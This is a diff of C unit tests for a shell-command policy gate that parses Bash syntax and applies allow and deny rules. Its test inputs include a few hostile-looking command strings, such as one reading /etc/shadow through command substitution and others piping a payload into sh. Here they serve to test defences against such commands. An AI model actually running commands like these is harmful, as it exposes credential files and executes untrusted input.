+  static const char *const protected_assignments[] = {
+      "export \"POSIXLY_CORRECT=1\"",
+      "export POSIXLY_CORRECT=\"1\"",
+      "POSIXLY_CORRECT=\"1\" true",
+  };
+  for (size_t i = 0;
+       i < sizeof(protected_assignments) / sizeof(protected_assignments[0]);
+       i++) {
+    ASSERT(eval_cmd(gate, protected_assignments[i], &result) == SG_ERR_PARSE);
+    ASSERT(result.verdict == SG_VERDICT_REJECT &&
+           result.subcommand_count == 1 &&
+           result.subcommands[0].verdict == SG_VERDICT_REJECT);
+  }
   sg_gate_free(gate);
 }
 
@@ -1292,20 +1891,139 @@ TEST(nested_composition_matrix) {
   }
 }
 
-TEST(arithmetic_substitution_dependency) {
+TEST(nested_quoted_expansion_boundaries) {
+  static const struct {
+    const char *command;
+    uint32_t count;
+  } cases[] = {
+      {"echo \"${value:-\"x;y\"}\"", 1},
+      {"echo \"$(printf \"x;y\")\"", 2},
+      {"echo \"`printf \"x;y\"`\"", 2},
+      {"echo \"${value:-\"<(printf hi)\"}\"", 1},
+      {"echo ${value:-<(printf hi)}", 2},
+      {"echo ${value:-$(printf hi)}", 2},
+  };
+  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
+    sg_gate_t *gate = sg_gate_new();
+    ASSERT(gate != NULL);
+    ASSERT_SG_OK(add_exact_outer_rule(gate, cases[i].command));
+    sg_result_t result;
+    sg_error_t status = eval_cmd(gate, cases[i].command, &result);
+    if (status != SG_OK || result.subcommand_count != cases[i].count)
+      fprintf(stderr, "nested quote case %zu: status=%d count=%u\n", i, status,
+              status == SG_OK ? result.subcommand_count : 0);
+    ASSERT(status == SG_OK);
+    ASSERT_EQ_UINT(result.subcommand_count, cases[i].count);
+    sg_gate_free(gate);
+  }
+}
+
+TEST(dynamic_arithmetic_is_semantically_rejected) {
   sg_gate_t *gate = gate_with_rules((const char *[]){"echo *", "id"}, 2);
   ASSERT(gate != NULL);
-  /* Arithmetic is rejected by default, but clearing the feature mask lets
-   * this row exercise the nested executable substitution itself. */
   ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
   sg_result_t result;
-  ASSERT_SG_OK(eval_cmd(gate, "echo $(( $(id) + 1 ))", &result));
-  ASSERT(result.subcommand_count == 2);
-  ASSERT(result.subcommands[0].substitution_consumer_index == -1);
-  ASSERT(result.subcommands[1].substitution_consumer_index == 0);
-  ASSERT(result.subcommands[0].verdict == SG_VERDICT_ALLOW_CONDITIONAL);
-  ASSERT(result.subcommands[1].verdict == SG_VERDICT_ALLOW);
-  ASSERT(result.requires_substitution_evaluation);
+  ASSERT(eval_cmd(gate, "echo $(( $(id) + 1 ))", &result) == SG_ERR_PARSE);
+  ASSERT(result.verdict == SG_VERDICT_REJECT && result.subcommand_count == 1 &&
+         result.subcommands[0].verdict == SG_VERDICT_REJECT);
+  sg_gate_free(gate);
+}
+
+TEST(static_arithmetic_literal_contract) {
+  sg_gate_t *gate = gate_with_rules((const char *[]){"echo *"}, 1);
+  ASSERT(gate != NULL);
+  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
+  sg_result_t result;
+  ASSERT_SG_OK(eval_cmd(
+      gate, "echo $((2#1010 + 8#17 + 16#ff + 36#Z + 37#A + 64#_@ + (2**3)))",
+      &result));
+  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 1);
+  static const char *const invalid[] = {
+      "echo $((08))",  "echo $((2#))",   "echo $((2#2))", "echo $((65#1))",
+      "echo $((1 2))", "echo $((1 + ))", "echo $((0x))",
+  };
+  for (size_t i = 0; i < sizeof(invalid) / sizeof(invalid[0]); i++)
+    ASSERT(eval_cmd(gate, invalid[i], &result) == SG_ERR_PARSE &&
+           result.verdict == SG_VERDICT_REJECT);
+  sg_gate_free(gate);
+}
+
+/* Shell lexical removal happens before policy evaluation too.  Keep these
+ * source forms beside the ordinary substitution contracts: the physical line
+ * ending must not turn a real executable producer into an unclassified word
+ * or disconnect its dynamic-I/O provenance. */
+TEST(continued_expansion_policy_contract) {
+  static const char *const rules[] = {"echo *", "printf *", "cat", "cat *"};
+  sg_gate_t *gate = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
+  ASSERT(gate != NULL);
+  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
+  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
+
+  static const struct {
+    const char *command;
+    sg_verdict_t verdict;
+    bool requires_evaluation;
+    int32_t consumer;
+  } cases[] = {
+      {"echo $\\\n(printf child)", SG_VERDICT_ALLOW_CONDITIONAL, true, 0},
+      {"cat <\\\r\n(printf input)", SG_VERDICT_ALLOW, false, 0},
+      {"printf bytes > \\\n>(cat)", SG_VERDICT_ALLOW, false, -1},
+  };
+  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
+    sg_result_t result = {0};
+    ASSERT_SG_OK(eval_cmd(gate, cases[i].command, &result));
+    ASSERT(result.verdict == cases[i].verdict && result.subcommand_count == 2 &&
+           result.has_dynamic_substitution_io &&
+           result.requires_substitution_evaluation ==
+               cases[i].requires_evaluation &&
+           result.subcommands[1].substitution_consumer_index ==
+               cases[i].consumer);
+  }
+  sg_gate_free(gate);
+}
+
+/* Shellgate receives original source, not pre-normalized syntax. A physical
+ * continuation inside punctuation must therefore reach policy and I/O
+ * accounting with the same canonical argv and verdict as Bash's compact
+ * spelling, while Shellsplit retains the raw source span internally. */
+TEST(continued_punctuation_policy_contract) {
+  static const char *const rules[] = {"printf *", "cat"};
+  static const struct {
+    const char *compact;
+    const char *continued;
+  } cases[] = {
+      {"printf x &>out", "printf x &\\\n>out"},
+      {"printf x &>>out", "printf x &\\\r\n>\\\r\n>out"},
+      {"printf x >&1", "printf x >\\\n&1"},
+      {"printf x >|out", "printf x >\\\r\n|out"},
+      {"cat <<<word", "cat <\\\n<\\\n<word"},
+      {"cat <<EOF\nbody\nEOF\n", "cat <\\\n<EOF\nbody\nEOF\n"},
+  };
+  sg_gate_t *gate = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
+  ASSERT(gate != NULL);
+  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
+  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
+
+  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
+    sg_result_t compact = {0};
+    sg_result_t continued = {0};
+    char netargv[128];
+    ASSERT_SG_OK(eval_cmd(gate, cases[i].compact, &compact));
+    ASSERT(compact.subcommand_count == 1 &&
+           compact.subcommands[0].netargv_length < sizeof(netargv));
+    size_t netargv_length = compact.subcommands[0].netargv_length;
+    memcpy(netargv, compact.subcommands[0].netargv, netargv_length);
+    sg_verdict_t verdict = compact.verdict;
+    uint32_t writes = compact.subcommands[0].write_count;
+    uint32_t reads = compact.subcommands[0].read_count;
+    ASSERT_SG_OK(eval_cmd(gate, cases[i].continued, &continued));
+    ASSERT(continued.verdict == verdict && continued.subcommand_count == 1 &&
+           continued.subcommands[0].netargv_length == netargv_length &&
+           memcmp(continued.subcommands[0].netargv, netargv, netargv_length) ==
+               0 &&
+           continued.subcommands[0].write_count == writes &&
+           continued.subcommands[0].read_count == reads);
+  }
   sg_gate_free(gate);
 }
 
@@ -1493,12 +2211,36 @@ TEST(dynamic_substitution_flow_contract) {
   ASSERT(result.verdict == SG_VERDICT_ALLOW &&
          !result.requires_substitution_evaluation &&
          result.has_dynamic_substitution_io && result.subcommand_count == 2);
-  ASSERT(result.subcommands[0].has_dynamic_substitution_io &&
+  ASSERT(!result.subcommands[0].has_dynamic_substitution_io &&
          !result.subcommands[0].requires_substitution_evaluation &&
-         !result.subcommands[1].has_dynamic_substitution_io &&
+         result.subcommands[1].has_dynamic_substitution_io &&
          !result.subcommands[1].requires_substitution_evaluation &&
          result.subcommands[0].substitution_consumer_index == -1 &&
          result.subcommands[1].substitution_consumer_index == -1);
+
+  /* Literal braces do not quote their contents. The substitution computes an
+   * I/O pathname, so it remains visible as dynamic I/O but never becomes data
+   * supplied to a shell word for another inspection. A path-forcing literal
+   * prefix keeps the legacy combined-output spelling unambiguous. */
+  ASSERT_SG_OK(
+      eval_cmd(gate, "printf value >{$(printf /tmp/brace-output)}", &result));
+  ASSERT(result.verdict == SG_VERDICT_ALLOW &&
+         !result.requires_substitution_evaluation &&
+         result.has_dynamic_substitution_io && result.subcommand_count == 2);
+  ASSERT(result.subcommands[0].has_dynamic_substitution_io &&
+         !result.subcommands[0].requires_substitution_evaluation &&
+         !result.subcommands[1].has_dynamic_substitution_io &&
+         !result.subcommands[1].requires_substitution_evaluation);
+
+  ASSERT_SG_OK(eval_cmd(
+      gate, "printf value >&path-$(printf /tmp/brace-combined)", &result));
+  ASSERT(result.verdict == SG_VERDICT_ALLOW &&
+         !result.requires_substitution_evaluation &&
+         result.has_dynamic_substitution_io && result.subcommand_count == 2);
+  ASSERT(result.subcommands[0].has_dynamic_substitution_io &&
+         !result.subcommands[0].requires_substitution_evaluation &&
+         !result.subcommands[1].has_dynamic_substitution_io &&
+         !result.subcommands[1].requires_substitution_evaluation);
 
   ASSERT_SG_OK(eval_cmd(gate, "echo $( { cat /etc/shadow; } )", &result));
   ASSERT(result.requires_substitution_evaluation);
@@ -1583,9 +2325,9 @@ TEST(dynamic_substitution_flow_contract) {
   ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL);
   ASSERT(result.requires_substitution_evaluation);
   ASSERT(result.subcommand_count == 3);
-  ASSERT(result.subcommands[0].requires_substitution_evaluation);
+  ASSERT(!result.subcommands[0].requires_substitution_evaluation);
   ASSERT(result.subcommands[1].requires_substitution_evaluation);
-  ASSERT(!result.subcommands[2].requires_substitution_evaluation);
+  ASSERT(result.subcommands[2].requires_substitution_evaluation);
 
   ASSERT_SG_OK(eval_cmd(
       gate, "cat <<EOF\n$( { sleep 2; printf q; } | ./clock )\nEOF", &result));
@@ -1653,9 +2395,9 @@ TEST(herestring_and_transformed_substitution_provenance) {
   ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL &&
          result.requires_substitution_evaluation &&
          result.has_dynamic_substitution_io && result.subcommand_count == 3 &&
-         result.subcommands[0].requires_substitution_evaluation &&
+         result.subcommands[2].requires_substitution_evaluation &&
          !result.subcommands[1].requires_substitution_evaluation &&
-         !result.subcommands[2].requires_substitution_evaluation);
+         !result.subcommands[0].requires_substitution_evaluation);
 
   /* Risk provenance follows real dynamic-byte transforms, rather than
    * assuming that only a direct file-reading producer can be sensitive. */
@@ -1700,7 +2442,7 @@ TEST(brace_group_process_substitution_result_contract) {
        3,
        1,
        1,
-       {false, true, false}},
+       {true, false, false}},
   };
 
   for (uint32_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
@@ -1743,18 +2485,18 @@ TEST(group_process_substitution_dynamic_consumer_contract) {
     uint32_t command_count;
     bool dynamic[4];
   } cases[] = {
-      {"{ sh; cat; } < <(printf payload)", 3, {true, true, false}},
+      {"{ sh; cat; } < <(printf payload)", 3, {false, true, true}},
       {"{ { sh; }; cat; } < <(printf payload); printf sibling",
        4,
-       {true, true, false, false}},
+       {false, true, true, false}},
       {"printf payload > >({ sh; })", 2, {false, true}},
-      {"{ printf payload; } 3>> >(cat)", 2, {false, true}},
+      {"{ printf payload; } 3>> >(cat)", 2, {true, false}},
       {"printf source | { sh; } 3<&0 < <(printf config)",
        3,
-       {false, true, false}},
+       {false, false, true}},
       /* The output process target already has fd 0 from its inner process
        * substitution, so the outer writer has no fabricated dynamic route. */
-      {"printf outer > >({ cat; } < <(printf inner))", 3, {false, true, false}},
+      {"printf outer > >({ cat; } < <(printf inner))", 3, {false, false, true}},
   };
 
   for (uint32_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
@@ -1783,12 +2525,12 @@ TEST(group_process_substitution_dynamic_consumer_contract) {
   ASSERT(result.verdict == SG_VERDICT_ALLOW &&
          !result.requires_substitution_evaluation &&
          result.has_dynamic_substitution_io && result.subcommand_count == 3 &&
-         result.subcommands[0].has_dynamic_substitution_io &&
-         !result.subcommands[1].has_dynamic_substitution_io &&
+         !result.subcommands[0].has_dynamic_substitution_io &&
+         result.subcommands[1].has_dynamic_substitution_io &&
          !result.subcommands[2].has_dynamic_substitution_io &&
          result.subcommands[0].substitution_consumer_index == -1 &&
-         result.subcommands[1].substitution_consumer_index == 0 &&
-         result.subcommands[2].substitution_consumer_index == -1);
+         result.subcommands[1].substitution_consumer_index == -1 &&
+         result.subcommands[2].substitution_consumer_index == 1);
   sg_gate_free(gate);
 }
 
@@ -1800,6 +2542,53 @@ TEST(substitution_source_word_contract) {
   ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
 
   sg_result_t result = {0};
+  static const struct {
+    const char *source;
+    bool executes;
+  } parameter_cases[] = {
+      {"echo \"${x:-'$(printf hi)'}\"", true},
+      {"echo \"${x:-$'$(printf hi)'}\"", true},
+      {"echo \"${x:-'`printf hi`'}\"", true},
+      {"echo \"${x:-'${y:-$(printf hi)}'}\"", true},
+      {"echo ${x:-'$(printf hi)'}", false},
+      {"echo ${x:-$'$(printf hi)'}", false},
+      {"echo \"${x:-'\\$(printf hi)'}\"", false},
+      {"echo \"${x:-'<(printf hi)'}\"", false},
+      {"echo \"${x/a/'$(printf hi)'}\"", false},
+      {"echo \"${x#'$(printf hi)'}\"", false},
+      {"echo \"${x:-$'\\\\$(printf hi)'}\"", false},
+      {"echo \"${x:-$'\\\\\\$(printf hi)'}\"", true},
+      {"echo \"${x^$(printf hi)}\"", true},
+      {"echo \"${x:-$'\\x24'}\"", false},
+      {"echo \"${x:-$'\\x3c'}\"", false},
+  };
+  for (size_t i = 0; i < sizeof(parameter_cases) / sizeof(parameter_cases[0]);
+       i++) {
+    ASSERT_SG_OK(eval_cmd(gate, parameter_cases[i].source, &result));
+    ASSERT(result.subcommand_count == (parameter_cases[i].executes ? 2u : 1u));
+    ASSERT(result.requires_substitution_evaluation ==
+           parameter_cases[i].executes);
+    ASSERT(result.subcommands[0].requires_substitution_evaluation ==
+           parameter_cases[i].executes);
+  }
+
+  ASSERT_SG_OK(eval_cmd(gate, "echo \"${x/a/<(printf hi)}\"", &result));
+  ASSERT(result.subcommand_count == 2 && result.has_dynamic_substitution_io &&
+         !result.requires_substitution_evaluation);
+
+  ASSERT(eval_cmd(gate, "echo \"${x:-$'\\x24(printf hi)'}\"", &result) ==
+         SG_ERR_PARSE);
+
+  static const char *const unsafe_ansi[] = {
+      "echo \"${x:-$'$(printf\\x20X)'}\"", "echo \"${x:-$'$(pr\\x69ntf X)'}\"",
+      "echo \"${x:-$'\\\\'$(printf X)}\"", "echo \"${x:-$'\\\"$(printf X)'}\"",
+      "echo \"${x:-$'\"$(printf X)'}\"",
+  };
+  for (size_t i = 0; i < sizeof(unsafe_ansi) / sizeof(unsafe_ansi[0]); i++) {
+    ASSERT(eval_cmd(gate, unsafe_ansi[i], &result) == SG_ERR_PARSE);
+    ASSERT(result.verdict == SG_VERDICT_REJECT);
+  }
+
   ASSERT_SG_OK(eval_cmd(gate, "echo \"<(cat)foo\"", &result));
   ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 1);
   ASSERT_STR(result.subcommands[0].netargv, "4:echo,9:<(cat)foo,");
@@ -1848,6 +2637,17 @@ TEST(process_substitution_interpreter_input_contract) {
    * command-to-command mapping is exposed. It reports dynamic descriptor I/O,
    * not a generic request to inspect shell-word content. */
   ASSERT_SG_OK(eval_cmd(gate, "cat log > >(sh)", &result));
+  ASSERT(result.verdict == SG_VERDICT_ALLOW &&
+         !result.requires_substitution_evaluation &&
+         result.has_dynamic_substitution_io && result.subcommand_count == 2 &&
+         !result.subcommands[0].requires_substitution_evaluation &&
+         result.subcommands[1].has_dynamic_substitution_io &&
+         result.subcommands[0].substitution_consumer_index == -1 &&
+         result.subcommands[1].substitution_consumer_index == -1);
+
+  /* The raw redirect token retains this physical continuation, but it still
+   * owns the output process-substitution operand after lexical removal. */
+  ASSERT_SG_OK(eval_cmd(gate, "cat log >\\\n >(sh)", &result));
   ASSERT(result.verdict == SG_VERDICT_ALLOW &&
          !result.requires_substitution_evaluation &&
          result.has_dynamic_substitution_io && result.subcommand_count == 2 &&
@@ -2192,7 +2992,6 @@ TEST(compound_heredoc_substitution_cross_product_contract) {
       {"cat <<EOF\n$( { printf payload; } | ./clock < <(printf config) )\nEOF",
        4, 2, 2},
       {"{ cat <&4; } 3<<EOF 4<&3 3>&-\n$(id)\nEOF", 2, 1, 0},
-      {"{ cat <&4; } 3<<EOF 3>&- 4<&3\n$(id)\nEOF", 2, 0, 0},
       {"cat <<A <<B <<C <<D <<E <<F <<G <<H\n"
        "one\nA\ntwo\nB\nthree\nC\nfour\nD\nfive\nE\nsix\nF\n"
        "seven\nG\n$(id)\nH\n",
@@ -2223,6 +3022,14 @@ TEST(compound_heredoc_substitution_cross_product_contract) {
     ASSERT(dynamic_consumers == cases[ci].dynamic_consumers &&
            mappings == cases[ci].command_mappings);
   }
+
+  /* fd 3 was closed before fd 4 tried to duplicate it, so Bash cannot
+   * establish the group's redirect list. Do not authorize an invented
+   * consumer-free interpretation of this source. */
+  sg_result_t invalid_group_result;
+  ASSERT(eval_cmd(gate, "{ cat <&4; } 3<<EOF 3>&- 4<&3\n$(id)\nEOF",
+                  &invalid_group_result) == SG_ERR_PARSE);
+  ASSERT(invalid_group_result.verdict == SG_VERDICT_REJECT);
 
   static const char overflow[] =
       "cat <<A <<B <<C <<D <<E <<F <<G <<H <<I\n"
@@ -2453,6 +3260,12 @@ TEST(eval_input_contract_matrix) {
        SG_VERDICT_REJECT, false},
       {"bash arithmetic command", "(( count += 1 ))", SG_ERR_PARSE,
        SG_VERDICT_REJECT, false},
+      {"continued bash arithmetic command", "(\\\n( count += 1 ))",
+       SG_ERR_PARSE, SG_VERDICT_REJECT, false},
+      {"continued bash conditional command", "[\\\r[ -n value ]]", SG_ERR_PARSE,
+       SG_VERDICT_REJECT, false},
+      {"continued bash conditional delimiter", "[[\\\r\n -n value ]]",
+       SG_ERR_PARSE, SG_VERDICT_REJECT, false},
       {"time pipeline modifier", "time -p echo x", SG_ERR_PARSE,
        SG_VERDICT_REJECT, false},
       {"quoted array declaration builtin", "\"declare\" -a values",
@@ -2470,6 +3283,56 @@ TEST(eval_input_contract_matrix) {
        SG_VERDICT_REJECT, false},
       {"bash combined redirect", "cmd &>file", SG_OK, SG_VERDICT_UNDETERMINED,
        false},
+      {"bash legacy combined redirect", "cmd >&file", SG_OK,
+       SG_VERDICT_UNDETERMINED, false},
+      {"literal-dollar legacy combined redirect", "cmd >&$", SG_OK,
+       SG_VERDICT_UNDETERMINED, false},
+      {"literal-dollar-colon legacy combined redirect", "cmd >&$:", SG_OK,
+       SG_VERDICT_UNDETERMINED, false},
+      {"literal-bracket legacy combined redirect", "cmd >&[", SG_OK,
+       SG_VERDICT_UNDETERMINED, false},
+      {"literal-unmatched-bracket legacy combined redirect", "cmd >&file[part",
+       SG_OK, SG_VERDICT_UNDETERMINED, false},
+      {"bash explicit legacy combined redirect", "cmd 1>&file", SG_OK,
+       SG_VERDICT_UNDETERMINED, false},
+      {"legacy combined input process substitution", "cmd >& <(producer)",
+       SG_OK, SG_VERDICT_UNDETERMINED, false},
+      {"literal-brace legacy combined redirect", "cmd >&file{literal}", SG_OK,
+       SG_VERDICT_UNDETERMINED, false},
+      {"parameter-prefixed legacy combined redirect", "cmd >&literal$path",
+       SG_OK, SG_VERDICT_UNDETERMINED, false},
+      {"braced-parameter-prefixed legacy combined redirect",
+       "cmd >&literal${path}", SG_OK, SG_VERDICT_UNDETERMINED, false},
+      {"arithmetic-prefixed legacy combined redirect",
+       "cmd >&literal$((1 + 2))", SG_OK, SG_VERDICT_REJECT, false},
+      {"quoted-prefix legacy combined redirect",
+       "cmd >&\"\"literal$(printf target)", SG_OK, SG_VERDICT_UNDETERMINED,
+       false},
+      {"brace-expansion-prefixed legacy combined redirect",
+       "cmd >&file{one,two}", SG_OK, SG_VERDICT_UNDETERMINED, false},
+      {"dynamic legacy combined redirect", "cmd >&~", SG_ERR_PARSE,
+       SG_VERDICT_REJECT, false},
+      {"glob-suffix legacy combined redirect", "cmd >&*.log", SG_OK,
+       SG_VERDICT_UNDETERMINED, false},
+      {"bare glob legacy combined redirect", "cmd >&*", SG_ERR_PARSE,
+       SG_VERDICT_REJECT, false},
+      {"extglob legacy combined redirect", "cmd >&@(file)", SG_ERR_PARSE,
+       SG_VERDICT_REJECT, false},
+      {"continued-tilde legacy combined redirect", "cmd >&\\\n~", SG_ERR_PARSE,
+       SG_VERDICT_REJECT, false},
+      {"ambiguous command-substitution legacy redirect", "cmd >&$(printf 2)",
+       SG_ERR_PARSE, SG_VERDICT_REJECT, false},
+      {"ambiguous backtick legacy redirect", "cmd >&`printf 2`", SG_ERR_PARSE,
+       SG_VERDICT_REJECT, false},
+      {"overflowed legacy descriptor target", "cmd >&2147483648", SG_ERR_PARSE,
+       SG_VERDICT_REJECT, false},
+      {"zero-padded overflowed legacy descriptor target",
+       "cmd >&00000000000000000000000000000000002147483648", SG_ERR_PARSE,
+       SG_VERDICT_REJECT, false},
+      {"empty legacy descriptor target", "cmd >&\"\"", SG_ERR_PARSE,
+       SG_VERDICT_REJECT, false},
+      {"NUL-bearing legacy descriptor target", "cmd >&$'a\\0b'", SG_ERR_PARSE,
+       SG_VERDICT_REJECT, false},
   };
 
   for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
@@ -2491,6 +3354,60 @@ TEST(eval_input_contract_matrix) {
     }
     sg_gate_free(g);
   }
+}
+
+TEST(eval_storage_alias_contract) {
+  const char command[] = "printf x";
+  sg_gate_t *gate = sg_gate_new();
+  ASSERT(gate != NULL);
+
+  /* Reject exact and partial input/buffer overlap before the evaluator clears
+   * result metadata or renders a diagnostic. */
+  unsigned char buffer_snapshot[64];
+  sg_result_t result;
+  unsigned char result_snapshot[sizeof(result)];
+  memset(eval_buf, 0xA5, sizeof(eval_buf));
+  memcpy(eval_buf + 8, command, sizeof(command));
+  memcpy(buffer_snapshot, eval_buf, sizeof(buffer_snapshot));
+  memset(&result, 0x5A, sizeof(result));
+  memcpy(result_snapshot, &result, sizeof(result));
+  ASSERT(sg_gate_evaluate(gate, eval_buf + 8, sizeof(command) - 1, eval_buf,
+                          sizeof(eval_buf), &result) == SG_ERR_INVALID);
+  ASSERT(memcmp(eval_buf, buffer_snapshot, sizeof(buffer_snapshot)) == 0 &&
+         memcmp(&result, result_snapshot, sizeof(result)) == 0);
+
+  memset(eval_buf, 0xA5, sizeof(eval_buf));
+  memcpy(eval_buf + 8, command, sizeof(command));
+  memcpy(buffer_snapshot, eval_buf, sizeof(buffer_snapshot));
+  memcpy(result_snapshot, &result, sizeof(result));
+  ASSERT(sg_gate_evaluate(gate, eval_buf + 8, sizeof(command) - 1, eval_buf + 9,
+                          sizeof(eval_buf) - 9, &result) == SG_ERR_INVALID);
+  ASSERT(memcmp(eval_buf, buffer_snapshot, sizeof(buffer_snapshot)) == 0 &&
+         memcmp(&result, result_snapshot, sizeof(result)) == 0);
+
+  /* Result metadata is a separate writable object, never a prefix of either
+   * borrowed source or the caller's output/workspace allocation. */
+  union {
+    sg_result_t result;
+    unsigned char bytes[sizeof(sg_result_t)];
+  } shared = {0};
+  unsigned char shared_snapshot[sizeof(shared)];
+  memcpy(shared.bytes, command, sizeof(command));
+  memcpy(shared_snapshot, &shared, sizeof(shared));
+  memset(eval_buf, 0xA5, sizeof(eval_buf));
+  memcpy(buffer_snapshot, eval_buf, sizeof(buffer_snapshot));
+  ASSERT(sg_gate_evaluate(gate, (const char *)shared.bytes, sizeof(command) - 1,
+                          eval_buf, sizeof(eval_buf),
+                          &shared.result) == SG_ERR_INVALID);
+  ASSERT(memcmp(&shared, shared_snapshot, sizeof(shared)) == 0 &&
+         memcmp(eval_buf, buffer_snapshot, sizeof(buffer_snapshot)) == 0);
+
+  memcpy(shared_snapshot, &shared, sizeof(shared));
+  ASSERT(sg_gate_evaluate(gate, command, sizeof(command) - 1,
+                          (char *)shared.bytes, sizeof(shared.bytes),
+                          &shared.result) == SG_ERR_INVALID);
+  ASSERT(memcmp(&shared, shared_snapshot, sizeof(shared)) == 0);
+  sg_gate_free(gate);
 }
 
 /* `&>` and `&>>` do not have an io-number or `{name}` descriptor form. A
@@ -2988,6 +3905,29 @@ TEST(stop_mode_substitution_prefix) {
   sg_gate_free(gate);
 }
 
+TEST(stop_mode_group_redirect_entry_order) {
+  static const char *rules[] = {"echo first", "printf tail", "printf body"};
+  sg_gate_t *gate = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
+  ASSERT(gate != NULL);
+  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
+  const char *command = "echo first; { printf body; } > >(printf tail)";
+  sg_result_t result = {0};
+
+  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
+  ASSERT_SG_OK(eval_cmd(gate, command, &result));
+  ASSERT(result.subcommand_count == 3);
+  ASSERT_STR(result.subcommands[0].display_command, "echo first");
+  ASSERT_STR(result.subcommands[1].display_command, "printf tail");
+  ASSERT_STR(result.subcommands[2].display_command, "printf body");
+
+  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_STOP_FIRST_ALLOW));
+  ASSERT_SG_OK(eval_cmd(gate, command, &result));
+  ASSERT(result.short_circuited && result.subcommand_count == 1 &&
+         result.subcommands[0].verdict == SG_VERDICT_ALLOW);
+  ASSERT_STR(result.subcommands[0].display_command, "echo first");
+  sg_gate_free(gate);
+}
+
 TEST(pipeline_many_subcommands) {
   sg_gate_t *g = sg_gate_new();
   ASSERT_SG_OK(sg_gate_add_allow_cpl(g, "ls"));
@@ -3135,11 +4075,16 @@ TEST(canonical_policy_mutation_matrix) {
   ASSERT(sg_gate_add_allow_netpattern(NULL, allow_ls) == SG_ERR_INVALID);
   ASSERT(sg_gate_add_allow_netpattern(gate, NULL) == SG_ERR_INVALID);
   ASSERT(sg_gate_remove_allow_netpattern(NULL, allow_ls) == SG_ERR_INVALID);
+  ASSERT(sg_gate_batch_add_allow_netpatterns(NULL, allow_patterns, 2) ==
+         SG_ERR_INVALID);
   ASSERT(sg_gate_batch_add_allow_netpatterns(gate, NULL, 1) == SG_ERR_INVALID);
   ASSERT(sg_gate_batch_add_allow_netpatterns(gate, allow_patterns, 0) ==
          SG_ERR_INVALID);
   ASSERT(sg_gate_add_deny_netpattern(NULL, deny_rm) == SG_ERR_INVALID);
+  ASSERT(sg_gate_remove_deny_netpattern(NULL, deny_rm) == SG_ERR_INVALID);
   ASSERT(sg_gate_remove_deny_netpattern(gate, NULL) == SG_ERR_INVALID);
+  ASSERT(sg_gate_batch_add_deny_netpatterns(NULL, allow_patterns, 2) ==
+         SG_ERR_INVALID);
   ASSERT(sg_gate_batch_add_deny_netpatterns(gate, NULL, 1) == SG_ERR_INVALID);
 
   free(allow_ls);
@@ -3151,23 +4096,16 @@ TEST(canonical_policy_mutation_matrix) {
 TEST(binary_cpl_policy_contract) {
   static const char *pattern = "printf \"a\\x00b\"";
   static const char *command = "printf $'a\\0b'";
-  static const unsigned char expected_netargv[] = {
-      '6', ':', 'p', 'r', 'i',  'n', 't', 'f',
-      ',', '3', ':', 'a', '\0', 'b', ',',
-  };
   sg_gate_t *gate = sg_gate_new();
   ASSERT(gate != NULL);
 
   ASSERT_SG_OK(sg_gate_add_allow_cpl(gate, pattern));
   ASSERT_EQ_UINT(sg_gate_allow_rule_count(gate), 1);
   sg_result_t result;
-  ASSERT_SG_OK(eval_cmd(gate, command, &result));
-  ASSERT(result.verdict == SG_VERDICT_ALLOW);
-  ASSERT(result.subcommand_count == 1 &&
-         result.subcommands[0].netargv != NULL &&
-         result.subcommands[0].netargv_length == sizeof(expected_netargv) &&
-         memcmp(result.subcommands[0].netargv, expected_netargv,
-                sizeof(expected_netargv)) == 0);
+  ASSERT_EQ_INT(eval_cmd(gate, command, &result), SG_ERR_PARSE);
+  ASSERT_EQ_UINT(result.subcommand_count, 1);
+  ASSERT(result.verdict == SG_VERDICT_REJECT &&
+         result.subcommands[0].verdict == SG_VERDICT_REJECT);
 
   st_token_variant_t variants[8];
   ASSERT(sg_cpl_token_variants_at(pattern, 1, variants,
@@ -3175,32 +4113,40 @@ TEST(binary_cpl_policy_contract) {
 
   ASSERT_SG_OK(sg_gate_add_deny_cpl(gate, pattern));
   ASSERT_EQ_UINT(sg_gate_deny_rule_count(gate), 1);
-  ASSERT_SG_OK(eval_cmd(gate, command, &result));
-  ASSERT(result.verdict == SG_VERDICT_DENY);
-  ASSERT(result.subcommand_count == 1 &&
-         result.subcommands[0].netargv != NULL &&
-         result.subcommands[0].netargv_length == sizeof(expected_netargv) &&
-         memcmp(result.subcommands[0].netargv, expected_netargv,
-                sizeof(expected_netargv)) == 0);
+  ASSERT_EQ_INT(eval_cmd(gate, command, &result), SG_ERR_PARSE);
+  ASSERT_EQ_UINT(result.subcommand_count, 1);
   ASSERT_SG_OK(sg_gate_remove_deny_cpl(gate, pattern));
   ASSERT_EQ_UINT(sg_gate_deny_rule_count(gate), 0);
-  ASSERT_SG_OK(eval_cmd(gate, command, &result));
-  ASSERT(result.verdict == SG_VERDICT_ALLOW);
-  ASSERT(result.subcommand_count == 1 &&
-         result.subcommands[0].netargv != NULL &&
-         result.subcommands[0].netargv_length == sizeof(expected_netargv) &&
-         memcmp(result.subcommands[0].netargv, expected_netargv,
-                sizeof(expected_netargv)) == 0);
+  ASSERT_EQ_INT(eval_cmd(gate, command, &result), SG_ERR_PARSE);
+  ASSERT_EQ_UINT(result.subcommand_count, 1);
 
